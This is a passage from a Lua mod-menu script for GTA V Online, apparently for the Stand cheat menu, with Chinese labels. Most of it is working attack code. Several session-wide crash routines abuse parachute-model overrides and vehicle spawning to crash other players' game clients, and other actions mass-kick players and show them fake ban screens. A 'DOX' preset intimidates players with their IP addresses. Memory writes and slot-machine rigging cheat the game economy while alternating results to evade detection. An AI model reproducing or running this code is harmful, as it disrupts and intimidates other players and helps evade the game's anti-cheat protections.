        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Ruiner2, SelfPlayerPos.x, SelfPlayerPos.y, 800, false, true, true)
        util.yield(200)
        VEHICLE.VEHICLE_SET_PARACHUTE_MODEL_OVERRIDE(Ruiner2, 	148511758)
        VEHICLE.VEHICLE_START_PARACHUTING(Ruiner2, true)
        util.yield(200)
        entities.delete_by_handle(Ruiner2)
    end

    for i = 1, 10 do
        local SelfPlayerPos = ENTITY.GET_ENTITY_COORDS(spped, true)
        local Ruiner2 = CreateVehicle(util.joaat("Ruiner2"), SelfPlayerPos, ENTITY.GET_ENTITY_HEADING(TTPed), true)
        PED.SET_PED_INTO_VEHICLE(spped, Ruiner2, -1)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Ruiner2, SelfPlayerPos.x, SelfPlayerPos.y, 500, false, true, true)
        util.yield(100)
        VEHICLE.VEHICLE_SET_PARACHUTE_MODEL_OVERRIDE(Ruiner2, 	260873931)
        VEHICLE.VEHICLE_START_PARACHUTING(Ruiner2, true)
        util.yield(100)
        entities.delete_by_handle(Ruiner2)
    end
    util.yield(200)

    for i = 1, 5 do
        local SelfPlayerPos = ENTITY.GET_ENTITY_COORDS(spped, true)
        local Ruiner2 = CreateVehicle(util.joaat("Ruiner2"), SelfPlayerPos, ENTITY.GET_ENTITY_HEADING(TTPed), true)
        PED.SET_PED_INTO_VEHICLE(spped, Ruiner2, -1)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Ruiner2, SelfPlayerPos.x, SelfPlayerPos.y, 300, false, true, true)
        util.yield(500)
        VEHICLE.VEHICLE_SET_PARACHUTE_MODEL_OVERRIDE(Ruiner2, 1381105889)
        VEHICLE.VEHICLE_START_PARACHUTING(Ruiner2, true)
        util.yield(500)
        entities.delete_by_handle(Ruiner2)
    end

    for i = 1, 25 do
        local SelfPlayerPos = ENTITY.GET_ENTITY_COORDS(spped, true)
        local Ruiner2 = CreateVehicle(util.joaat("Ruiner2"), SelfPlayerPos, ENTITY.GET_ENTITY_HEADING(TTPed), true)
        PED.SET_PED_INTO_VEHICLE(spped, Ruiner2, -1)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Ruiner2, SelfPlayerPos.x, SelfPlayerPos.y, 200, false, true, true)
        util.yield(150)
        VEHICLE.VEHICLE_SET_PARACHUTE_MODEL_OVERRIDE(Ruiner2, 	1500925016)
        VEHICLE.VEHICLE_START_PARACHUTING(Ruiner2, true)
        util.yield(150)
        entities.delete_by_handle(Ruiner2)
    end
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(spped, ppos.x, ppos.y, ppos.z, false, true, true)
    --^^
    for n = 0 , 2 do
        local object_hash = util.joaat("prop_logpile_06b")
        STREAMING.REQUEST_MODEL(object_hash)
          while not STREAMING.HAS_MODEL_LOADED(object_hash) do
           util.yield()
        end
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),object_hash)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, 0,0,100, false, true, true)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(SelfPlayerPed, 0xFBAB5776, 100, false)
        util.yield(800)
        for i = 0 , 1 do
            PED.FORCE_PED_TO_OPEN_PARACHUTE(SelfPlayerPed)
        end
        util.yield(800)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, PreviousPlayerPos.x, PreviousPlayerPos.y, PreviousPlayerPos.z, false, true, true)

        local object_hash2 = util.joaat("prop_beach_parasol_03")
        STREAMING.REQUEST_MODEL(object_hash2)
          while not STREAMING.HAS_MODEL_LOADED(object_hash2) do
           util.yield()
        end
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),object_hash2)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, 0,0,100, 0, 0, 1)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(SelfPlayerPed, 0xFBAB5776, 100, false)
        util.yield(800)
        for i = 0 , 1 do
            PED.FORCE_PED_TO_OPEN_PARACHUTE(SelfPlayerPed)
        end
        util.yield(800)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, PreviousPlayerPos.x, PreviousPlayerPos.y, PreviousPlayerPos.z, false, true, true)
    end
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, PreviousPlayerPos.x, PreviousPlayerPos.y, PreviousPlayerPos.z, false, true, true)


    PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user(), 0xFBF7D21F)
    WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user_ped, 0xFBAB5776, 100, false)
    TASK.TASK_PARACHUTE_TO_TARGET(user_ped, pos.x, pos.y, pos.z)
    util.yield()
    TASK.CLEAR_PED_TASKS_IMMEDIATELY(user_ped)
    util.yield(300)
    WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user_ped, 0xFBAB5776, 100, false)
    PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user)
    util.yield(1000)

    for i = 1, 10 do
        util.spoof_script("freemode", SYSTEM.WAIT)
    end
    ENTITY.SET_ENTITY_HEALTH(user_ped, 0)
    NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(pos.x,pos.y,pos.z, 0, false, false, 0)
    for i = 1, 2 do
        local SelfPlayerPos = ENTITY.GET_ENTITY_COORDS(spped, true)
        local Ruiner2 = CreateVehicle(util.joaat("Ruiner2"), SelfPlayerPos, ENTITY.GET_ENTITY_HEADING(TTPed), true)
        PED.SET_PED_INTO_VEHICLE(spped, Ruiner2, -1)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Ruiner2, SelfPlayerPos.x, SelfPlayerPos.y, 150, false, true, true)
        util.yield(200)
        VEHICLE.VEHICLE_SET_PARACHUTE_MODEL_OVERRIDE(Ruiner2, 	1500925016)
        VEHICLE.VEHICLE_START_PARACHUTING(Ruiner2, true)
        util.yield(200)
        entities.delete_by_handle(Ruiner2)
    end
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(spped, ppos.x, ppos.y, ppos.z, false, true, true)
    for i = 1, 2 do
    PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user(), 0xFBF7D21F)
    WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user_ped, 0xFBAB5776, 100, false)
    TASK.TASK_PARACHUTE_TO_TARGET(user_ped, pos.x, pos.y, pos.z)
    util.yield()
    TASK.CLEAR_PED_TASKS_IMMEDIATELY(user_ped)
    util.yield(200)
    WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user_ped, 0xFBAB5776, 100, false)
    PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user)
    util.yield(4500)
    for i = 1, 2 do
        util.spoof_script("freemode", SYSTEM.WAIT)
    end
    ENTITY.SET_ENTITY_HEALTH(user_ped, 0)
    NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(pos.x,pos.y,pos.z, 0, false, false, 0)

end
end)

    menu.action(sancrashr, "人物伞崩全局V1", {}, "崩溃全局", function()
        personlcrashv1()
    end)

    menu.action(sancrashr,"人物伞崩全局V2",{},"崩溃全局",function()
        personalcrashv2()
    end)

    menu.action(sancrashr,"人物伞崩全局V3",{},"崩溃全局",function()
        personalcrashv3()
    end)

    menu.action(sancrashr, "人物伞崩全局V4", {}, "慎用,可能会自崩", function()
        personalcrashv4()
    end)

    menu.action(sancrashr, "人物伞崩全局V5", {}, "崩溃全局", function()
        personalcrashv5()
    end)

    menu.action(sancrashr,"人物伞崩全局V6",{},"崩溃全局",function()
        rlengzhan()
    end)

menu.action(sancrashr, "人物伞崩全局V7", {""}, "崩溃全局", function()
    PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),0xE5022D03)
    TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()))
    util.yield(20)
    local p_pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()),p_pos.x,p_pos.y,p_pos.z,false,true,true)
    WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()), 0xFBAB5776, 1000, false)
    TASK.TASK_PARACHUTE_TO_TARGET(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()),-1087,-3012,13.94)
    util.yield(500)
    TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()))
    util.yield(1000)
    PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(PLAYER.PLAYER_ID())
    TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()))
 end)

    menu.action(crashr, "韦德崩溃", {}, "崩溃全局", function()
        wadecrash()
    end)

    menu.action(crashr, "耶稣的救赎", {}, "", function ()
        jesus_help_me()
    end)

    menu.action(crashr, "大傻逼全局崩", {}, "大概率自崩", function (on)
    util.yield(9000)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(players.user_ped(),players.user_ped(), 1, 1, 1, 1, 1, 1, 1, true, true, true, false, 1, true)
    end)

    menu.action(crashr, "大春逗崩溃", {}, "崩溃全局", function()
        big_chungus()
    end)

menu.action(crashr, "全局崩溃V9", {}, "请按住发送键5或空格", function()
    menu.trigger_commands("anticrashcamera on")
    if PED.IS_PED_IN_ANY_VEHICLE(GetLocalPed(), false) then
        local jet = PED.GET_VEHICLE_PED_IS_IN(GetLocalPed(), false)
        -- if VEHICLE.GET_VEHICLE_CLASS(jet) == 16 then --16 class is planes
        -- jet_netID = NETWORK.NETWORK_GET_NETWORK_ID_FROM_ENTITY(jet)
        ENTITY.SET_ENTITY_PROOFS(jet, true, true, true, true, true, true, true, true)
        -- ENTITY.SET_ENTITY_ROTATION(jet, 0, 0, 0, 2, true) -- rotation sync fuck
        -- local let_coords = coords[math.random(1, #coords)]--function() for i =1, 32 do if PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(i) then return ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(i)) end end end
        if players.exists(to_ply) then 
            local asda = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(to_ply)) 
            util.toast('Player ID: '..to_ply..' | asda.x: '.. asda.x.. 'asda.y: '.. asda.y..'asda.z: '.. asda.z)
            ENTITY.SET_ENTITY_COORDS(jet, asda.x, asda.y, asda.z + 50, false, false, false, true) 
            to_ply = to_ply +1
        else 
            if to_ply >= 32 then to_ply = 0 end
            to_ply = to_ply +1 
            local let_coords = coords[math.random(1, #coords)]
            ENTITY.SET_ENTITY_COORDS(jet, let_coords[1], let_coords[2], let_coords[3], false, false, false, true) 
        end
            
        ENTITY.SET_ENTITY_VELOCITY(jet, 0, 0, 0) -- velocity sync fuck
        ENTITY.SET_ENTITY_ROTATION(jet, 0, 0, 0, 2, true) -- rotation sync fuck
        local pedpos = ENTITY.GET_ENTITY_COORDS(GetLocalPed())
        pedpos.z = pedpos.z + 10
        for i = 1, 2 do
            local s_plane = planes[math.random(1, #planes)]
            RqModel(util.joaat(s_plane))
            local veha1 = entities.create_vehicle(util.joaat(s_plane), pedpos, 0)

            ENTITY.ATTACH_ENTITY_TO_ENTITY_PHYSICALLY(veha1, jet, 0, 0, 0, 0, 5 + (2 * i), 0, 0, 0, 0, 0, 0, 1000, true,
                true, true, true, 2)
        end
        AddEntityToList("Plane: ", jet, true)
        util.toast("等待同步5秒...")
        util.yield(3500) -- 5k is original
        for i = 1, 25 do -- 50 is original
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(jet, math.random(0, 2555), math.random(0, 2815), math.random(1, 1232), false, false, false) 
            --ENTITY.SET_ENTITY_COORDS_NO_OFFSET(jet, 252, 2815, 120, false, false, false) -- far away teleport (sync fuck)
            util.yield()
        end
    else
        util.toast("警告|你不在车里")
        RqModel(util.joaat('hydra'))
        local spawn_in = entities.create_vehicle(util.joaat('hydra'), ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID()), 0.0)
        PED.SET_PED_INTO_VEHICLE(PLAYER.PLAYER_PED_ID(), spawn_in, -1)
    end
    
end)
menu.action(crashr, "防崩镜头关闭", {}, "", function()
    menu.trigger_commands("anticrashcamera off")
end)

    menu.action(crashr,"声音崩溃",{},"崩溃全局",function()
        soundcrash_all()
    end)

    menu.action(crashr,"CARGO崩溃",{},"崩溃全局",function()
        CARGO()
    end)

	menu.action(crashr, "数学崩溃", {}, "", function()
        numbercrash()
    end)

    menu.action(crashr, "大自然全局崩溃", {}, "", function()
        natural_crash_all()
    end) 

    menu.action(crashr, "董哥崩溃", {}, "如停不下来请关闭脚本", function()
        dgcrash()
    end) 

menu.action(crashr, "载具崩溃", {}, "", function()
    local model = {}
    local pos <const> = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(PlayerID)) pos.z = pos.z + 10
    local all_vel = entities.get_all_vehicles_as_handles()
    local crash = {}
    for parachute, model in pairs(all_vel) do
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(model,pos.x, pos.y, pos.z)
    crash[parachute] = set_vehicle_any_parachute(model,ENTITY.GET_ENTITY_MODEL(model),0x2b778668)
    for PlayerID = 0 ,32 do
    local peds = players.user_ped(PlayerID)
    if PlayerID ~= players.user() and players.exists(PlayerID) then
    PED.SET_PED_INTO_VEHICLE(peds,model,-1)
    VEHICLE._SET_VEHICLE_PARACHUTE_ACTIVE(model,true)
    util.yield(300)
    entities.delete_by_handle(model)
    end
    end
    end
    end)
	
	menu.action(crashr, "不知名崩", {}, "", function()
        nothingcrash()
    end)

    kickr = menu.list(allcrash, '全局踢出', {}, '')
    
    TXC_SLOW = false

    menu.action(kickr, "AIO踢", {"allaiokick", "allaiok"}, "可能在某些菜单上不起作用.", function ()
        AIOKickAll()
    end)

    menu.toggle(kickr, "更慢但是更好的AIO踢", {}, "", function (on)
        TXC_SLOW = on
        if SE_Notifications then
            util.toast("" .. tostring(on))
        end
    end)

    menu.action(allcrash, "声音", {"bedsound", "earrape"}, "在战局中播放大量的声音", function()
       zaoyin()
       util.yield(500)
       notification("~y~D'ooooooooooooooooh!!!!!!!!!",colors.blue)
    end)

	
-----------------------------------
-- Online
-----------------------------------

local online_funfeatures = menu.list(onlinemode, '娱乐选项', {}, '')

local fakemessages_root = menu.list(onlinemode, "虚假警告", {}, "虚假信息屏幕")

menu.slider(fakemessages_root, "延迟虚假消息", {}, "在显示虚假消息之前等待多长时间（以秒为单位）", 0, 300, 0, 1, function(s)
    fake_alert_delay = s*1000
end)

local fake_suspend_date = "2023年1月1日"
menu.text_input(fakemessages_root, "自定义暂停日期", {"customsuspensiondate"}, "" , function(on_input)
    fake_suspend_date = on_input
end, "2023年1月1日")

local custom_alert = "你好世界！"
menu.action(fakemessages_root, "自定义虚假消息文本", {"customfakealert"}, "输入您的虚假消息应显示的内容", function(on_click)
    notification("请输入您希望警告显示的内容", colors.blue)
    menu.show_command_box("customfakealert" .. " ")
end, function(on_command)
    show_custom_alert_until_enter(on_command)
end)


alert_options = {"禁令1", "禁令2", "服务不可用", "Stand天下第一!", "暂时封禁", "自定义"}
menu.list_action(fakemessages_root, "假警报", {"fakealert"}, "", alert_options, function(index, value, click_type)
    pluto_switch index do 
        case 1: 
            show_custom_alert_until_enter("您已被禁止进入GTA在线模式。~n~返回Grand Theft Auto V。")
            break 
        case 2:
            show_custom_alert_until_enter("您已被永久禁止进入GTA在线模式。~n~返回Grand Theft Auto V。")
            break
        case 3:
            show_custom_alert_until_enter("Rockstar游戏服务当前不可用。~n~请返回Grand Theft Auto V。")
            break
        case 4:
            show_custom_alert_until_enter("Stand天下第一!")
            break
        case 5:
            show_custom_alert_until_enter("您已被禁止进入GTA在线模式直到 " .. fake_suspend_date .. ".~n~此外,您的GTA在线模式角色将被重置。~n~Grand Theft Auto V。")
            break
        case 6:
            show_custom_alert_until_enter(custom_alert)
            break
    end
end)

menu.action(online_funfeatures, '雪球大战', {}, '给战局中的每个人雪球并通过文字通知它们', function ()
    local plist = players.list()
    local snowballs = util.joaat('WEAPON_SNOWBALL')
    for i = 1, #plist do
        local plyr = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(plist[i])
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(plyr, snowballs, 20, true)
        WEAPON.SET_PED_AMMO(plyr, snowballs, 20)
        players.send_sms(plist[i], players.user(), '雪球大战!你获得了雪球')
        util.yield()
    end
end)

menu.action(online_funfeatures, '美国暴乱', {}, '给战局中的每个人提供烟花发射器并通过文字通知它们', function ()
    local plist = players.list()
    local fireworks = util.joaat('weapon_firework')
    for i = 1, #plist do
        local plyr = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(plist[i])
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(plyr, fireworks, 20, true)
        WEAPON.SET_PED_AMMO(plyr, fireworks, 20)
        players.send_sms(plist[i], players.user(), '去你妈的美国!你获得了烟花')
        util.yield()
    end
end)

menu.toggle_loop(online_funfeatures, '金钱追踪', {}, '到处都是假钱袋', function ()
    local targets = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
    local tar1 = ENTITY.GET_ENTITY_COORDS(players.user_ped(), true)
    Streamptfx('scr_exec_ambient_fm')
    if TASK.IS_PED_WALKING(targets) or TASK.IS_PED_RUNNING(targets) or TASK.IS_PED_SPRINTING(targets) then
        GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD('scr_ped_foot_banknotes', tar1.x, tar1.y, tar1.z - 1, 0, 0, 0, 1.0, true, true, true)
    end
    
end)

menu.action(online_funfeatures, '停止观看', {'sspect'}, '停止在战局里观看任何人', function ()
    Specon(players.user())
    Specoff(players.user())
end)

menu.toggle_loop(online_funfeatures, '增加虎鲸导向导弹射程', {'krange'}, '你现在可在地图的任何地方使用', function ()
    if util.is_session_started() then
    memory.write_float(memory.script_global(262145 + 30176), 200000.0)
    end
end)


chat_presets_root = menu.list(onlinemode, "聊天预设", {"lancescriptchatpresets"},"聊天预设,为方便起见")

menu.action(chat_presets_root, "真实本地化 \"DOX\"", {}, "向每个人发送本地化的 \"DOX\" 。每个人都会认为你正在发出所有人的信息,而实际上,每个人都看到了自己的信息,没有人看到其他人。", function(click_type)
    showrealip()
end)

menu.action(chat_presets_root, "虚假的崩溃", {}, "发送本地化的假崩溃百分比条", function(click_type)
    chatcrash()
end)

menu.action(chat_presets_root, "虚假黑客", {}, "发出一个本地化的假黑入百分比条", function(click_type)
    fakechathacking()
end)

menu.action(chat_presets_root, "随机笑话", {"randomjoke"}, "随便讲个笑话。", function(click_type)
    ramdomjokelol()
end)

menu.toggle_loop(chat_presets_root, "随机笑话循环", {"randomjokeloop"}, "讲一个随机笑话，五秒循环一次", function(click_type)
    loopchatjoke()
end)
for k,v in pairs(chat_presets) do
    menu.action(chat_presets_root, k, {}, "\"" .. v .. "\"", function(click_type)
        chat.send_message(v, false, true, true)
    end)
end

randomizer_root = menu.list(onlinemode, "随机虚假器", {"lsrandomizer"}, "随机化Stand中的一些菜单数值.但是，这不会为您启用Stand中的选项； 它只会随机输入数值.")


menu.toggle(randomizer_root, "随机虚假名字", {}, "开启后切换战局才能生效.", function(on)
    ramdomfakename(on)
end)

menu.toggle(randomizer_root, "随机虚假IP", {}, "", function(on)
    ramdomfakeip(on)
end)

random_rank_spoof = false
menu.toggle(randomizer_root, "随机虚假等级", {}, "", function(on)
    ramdomfakelvl(on)
end)

menu.toggle_loop(randomizer_root, "虚假短信名称", {}, "", function(on)
    spamtextname(on)
end)

    local fakemoney = menu.list(onlinemode, '假钱', {'JSfakeMoney'}, '添加假钱,只能看不能花.')


        menu.action(fakemoney, '添加假钱', {'JSaddFakeMoney'}, '添加假钱1次.', function()
            addfakemoney()
        end)

        menu.toggle_loop(fakemoney, '循环假钱', {'JSloopFakeMoney'}, '设置循环添加钱的延迟.', function()
            loopaddfakemoney()
        end)

        menu.toggle(fakemoney, '显示"交易处理中"', {'JSfakeTransaction'}, '添加假钱的时候在右下角显示"交易处理中"的信息.', function(toggle)
            fakeMoneyTransactionPending = toggle
        end, fakeMoneyTransactionPending)

        local fakemoneyloopdelayasd = menu.list(fakemoney, '假钱循环延迟', {'JSexpDelay'}, '让您为假钱循环设置自定义延迟.')
        generateDelaySettings(fakemoneyloopdelayasd, '假钱循环延迟', fakeMoneyLoopDelay)

        menu.slider(fakemoney, '银行假钱', {'JSbankFakeMoney'}, '将会有多少假钱被添加到您的银行.', -2000000000, 2000000000, bankFakeMoney, 1, function(value)
            bankFakeMoney = value
        end)

        menu.slider(fakemoney, '现金假钱', {'JScashFakeMoney'}, '将会有多少假钱以现金形式添加.', -2000000000, 2000000000, cashFakeMoney, 1, function(value)
            cashFakeMoney = value
        end)

    local safemonitormode = menu.list(onlinemode, '保险箱监视器', {'JSsm'}, '保险箱监视器允许您监视您的保险箱. 它不会影响正在增加的钱')

    local safeMonitorToggle = false
    menu.toggle(safemonitormode, '启用监视', {'SMtoggleAllSelected'}, '启用监视所有已选择的选项.', function(toggle)
        safeMonitorToggle = toggle
    end)

    generateToggles(JS_tbls.safeManagerToggles, safemonitormode, false)

    local monitorsettings = menu.list(safemonitormode, '保险箱监视器设置', {'SMsettings'}, '屏幕文字信息设置')

    smSettings = new.hudSettings(-3, 0, 2)
    generateHudSettings(monitorsettings, 'SM', smSettings)

    local casinoasd = menu.list(onlinemode, '恢复选项[风险]', {'JScasino'}, '这里没有屏钱选项.')

    menu.divider(casinoasd, "致幻剂实验室管理")
menu.click_slider(casinoasd, "产品容量", {"productcapacity"}, "", 0, 1000, 160, 1, function(capacity)
    memory.write_int(memory.script_global(262145 + 18949), capacity) 
end)

menu.toggle(casinoasd, "免费供应", {"supplycost"}, "", function()
    memory.write_int(memory.script_global(262145 + 21869), 0)
end, function()
    memory.write_int(memory.script_global(262145 + 21869), 60000)
end)

menu.toggle(casinoasd, "提高生产效率", {"increaseproductionspeed"}, "", function()
    memory.write_int(memory.script_global(262145 + 17396), 100) 
end, function()
    memory.write_int(memory.script_global(262145 + 17396), 135000) 
end)

menu.action(casinoasd, "重新补给致幻剂", {"resupplyacid"}, "", function()
    local time = NETWORK.GET_CLOUD_TIME_AS_INT() - memory.read_int(memory.script_global(262145 + 18954))
    memory.write_int(memory.script_global(1648637 + 1 + 6), time)
end)

menu.click_slider(casinoasd, "出售价值倍数", {"value"}, "警告：经测试，安全金额约为200万。尽量不要超过，除非你头铁不怕封.", 0, 10000, 1, 1, function(value)
    memory.write_int(memory.script_global(262145 + 17425), value * 1485) 
end)

    menu.toggle_loop(casinoasd, '幸运转盘冷却Lucky', {'JSlwCool'}, '告诉您幸运转盘是否可用或距离它还有多长冷却时间.', function()
        casinolucky()
    end)

    menu.action(casinoasd, '赌场 赢/输', {'JScasinoLP'}, '告诉您在赌场赚了多少或输了多少.', function()
        casinolp()
    end)

    menu.action(casinoasd, "前往名钻豪华赌场!", {"tpcasino"}, "", function(click_type)
    ENTITY.SET_ENTITY_COORDS(players.user_ped(), 924.5333, 46.603252, 81.10639 , 1, 0, 0, 1)
end)

menu.action(casinoasd, "前往钻石赌博区!", {"tpslot"}, "闪闪发光!", function(click_type)
    math.randomseed()
    math.random()
    math.random()
    math.random()
    local r = math.random(1,3)
    if(r == 1) then
        ENTITY.SET_ENTITY_COORDS(players.user_ped(), 1113.7837, 239.45398, -49.84081 , 1, 0, 0, 1)
    elseif (r==2) then
        ENTITY.SET_ENTITY_COORDS(players.user_ped(), 1116.7186, 228.10817, -49.84075 , 1, 0, 0, 1)
    elseif (r==3) then
        ENTITY.SET_ENTITY_COORDS(players.user_ped(), 1137.0839, 252.51076, -51.035732 , 1, 0, 0, 1)
    end
end)

menu.action(casinoasd, "前往出纳员!", {"tpcashier"}, "去拿你辛苦工作的报酬吧!", function(click_type)
    ENTITY.SET_ENTITY_COORDS(players.user_ped(), 1116.0076, 219.90002, -49.435116 , 1, 0, 0, 1)
end)

menu.action(casinoasd, "循环赌博", {"startcasinoloop"}, "自动赢得老虎机头奖和离开老虎机: 这样你就不会触发赌场冷却时间. 建议用鼠标自动点击器挂机赚钱", function(click_type)
    loop = not loop
    util.show_corner_help("欢迎来到高端人士交际圈! 一定要下最大赌注.")
    while(loop) do
        menu.trigger_commands("rigslotmachines jackpot")
        for i=1,100 do 
            util.show_corner_help("回合获胜")
            util.yield(100)
        end
        menu.trigger_commands("rigslotmachines loss")
        for i=1,100 do 
            util.show_corner_help("回合输了")
            util.yield(100)
        end
    end
    util.toast("再见! 希望你赚了很多钱!")
end)

menu.action(casinoasd, "俄罗斯轮盘", {"roulette"}, "带你去俄罗斯轮盘,把它调到1.在第一张12上下注50k,在第一张1上下注5k", function(click_type)
    ENTITY.SET_ENTITY_COORDS(players.user_ped(), 1133.4238, 263.72913, -51.03577 , 1, 0, 0, 1)
    menu.trigger_commands("rigroulette 1")
end)

    menu.action(casinoasd, "随机传送", {"randomtp"}, "*使用自担风险* 可能会让你在地图或其他奇怪的东西下生成", function(click_type)
        local x,y,z,distToGround, currentHeight
        math.randomseed()
        math.random()
        math.random()
        math.random()
        x = math.random(-3430, 4130)
        y = math.random(-3560, 8000)
        menu.trigger_commands("posx "..x)
        menu.trigger_commands("posy "..y)
        menu.trigger_commands("posz "..ENTITY.GET_ENTITY_HEIGHT_ABOVE_GROUND(players.user_ped()))
end)

menus.auto_spin = menu.toggle(casinoasd, "自动旋转", {}, "将传送到赌场，然后是高支出的老虎机。坐下后，它将自动旋转插槽，在输赢之间交替以避免被发现，直到达到每日限制。明天再回来，再次运行脚本以获取更多信息。", function(on)
    state.auto_spin = on
end)

menus.daily_winnings = menu.readonly(casinoasd, "每日奖金")
refresh_daily_winnings()
menus.next_spin_time = menu.readonly(casinoasd, "距离下一次旋转的时间")
refresh_next_spin_time()

---
--- Options Menu
---

menu_options = menu.list(casinoasd, "选项")
menu.slider(menu_options, "目标每日奖金（百万）", {}, "设置在 24 小时内赢取的目标金额。在一天内赢得超过 5000 万美元可能会有风险。", 1, 100, math.floor(config.max_daily_winnings / 1000000), 1, function(value)
    config.max_daily_winnings = value * 1000000
    refresh_next_spin_time()
end)
menu.toggle(menu_options, "调试模式", {}, "", function(on)
    config.debug_mode = on
end, config.debug_mode)

menus.delays = menu.list(menu_options, "延误", {}, "在执行某些操作后调整暂停计时器")
menu.slider(menus.delays, "按下按钮", {}, "按下任意按钮后暂停的毫秒数", 300, 3000, config.delay_between_button_press, 100, function(value)
    config.delay_between_button_press = value
end)
menu.slider(menus.delays, "进入赌场", {}, "进入赌场后暂停的毫秒数", 500, 10000, config.delay_after_entering_casino, 100, function(value)
    config.delay_after_entering_casino = value
end)

---
--- Actions Menu
---

menus.actions = menu.list(menu_options, "行动", {}, "由自动旋转执行但可作为可选独立操作执行的操作")
menu.action(menus.actions, "传送到赌场", {}, "传送到赌场内部", function()
    teleport_to_casino()
end)
menu.action(menus.actions, "获取筹码", {}, "自动从赌场收银员获得50000筹码的每日限额", function()
    acquire_chips()
end)
menu.action(menus.actions, "查找老虎机", {}, "自动定位空置的高支出老虎机。", function()
    find_free_slot_machine()
end)
menu.action(menus.actions, "兑现筹码", {}, "自动兑现筹码，同时保留一些储备。", function()
    cash_out_chips()
end)

---
--- Spin Log Menu
---

spin_log_menu_items = {}
menus.spin_log = menu.list(menu_options, "查看旋转日志", {}, "查看以前旋转的日志", function()
    for _, spin_log_menu_item in pairs(spin_log_menu_items) do
        menu.delete(spin_log_menu_item)
    end
    local spin_log = load_spin_log()
    for index, spin_log_item in pairs(spin_log) do
        --local time_ago = util.current_time_millis() - spin_log_item.time
        local time_ago = tostring(disp_time((util.current_time_millis() - spin_log_item.time) / 1000))
        local timestamp = (spin_log_item.log_time or "")
        local item = string.format("Spin #%d [%s] [%s] $%s", index, timestamp, time_ago, spin_log_item.winnings)
        local spin_log_item_menu = menu.readonly(menus.spin_log, item)
        --menu.readonly(spin_log_item_menu, "Time Ago", tostring(disp_time(time_ago / 1000)))
        ----menu.readonly(spin_log_item_menu, "Is Rigged", tostring(spin_log_item.is_rigged))
        --menu.readonly(spin_log_item_menu, "Winnings", tostring(spin_log_item.winnings))
        table.insert(spin_log_menu_items, spin_log_item_menu)
    end
end)

util.create_tick_handler(bandit_tick)
util.create_tick_handler(next_spin_time_tick)

    local timetrialsasd = menu.list(onlinemode, '时间挑战赛', {'JStt'}, '')

    menu.divider(timetrialsasd, '时间挑战赛')

    menu.toggle_loop(timetrialsasd, '时间挑战赛 最佳记录', {'JSbestTT'}, '', function()
        besttime()
    end)

    menu.action(timetrialsasd, '传送到时间挑战赛', {'JStpToTT'}, '', function()
        tptotime()
    end)

    menu.divider(timetrialsasd, 'RC匪徒时间挑战赛')

    menu.toggle_loop(timetrialsasd, 'RC匪徒时间挑战赛 最佳记录', {'JSbestRcTT'}, '', function()
        bestrctime()
    end)

    menu.action(timetrialsasd, '传送到RC匪徒时间挑战赛', {'JStpToRcTT'}, '', function()
        tptorctime()
    end)


    local blockareas = menu.list(onlinemode, '阻挡区域', {'JSblock'}, '用隐形墙阻挡某些区域,让其他人无法进入. 但如果您在加入战局的时候使用它,它会让你崩溃哈哈.')

